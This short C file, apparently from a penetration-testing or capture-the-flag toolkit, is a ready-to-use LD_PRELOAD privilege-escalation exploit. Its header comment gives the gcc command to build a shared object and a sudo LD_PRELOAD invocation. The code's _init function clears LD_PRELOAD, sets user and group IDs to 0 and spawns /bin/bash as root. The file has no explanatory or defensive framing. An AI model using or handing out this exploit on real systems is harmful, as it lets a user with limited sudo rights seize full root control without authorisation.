/*
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so <COMMAND WHAT THE USER CAN RUN WITH SUDO>
*/


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}

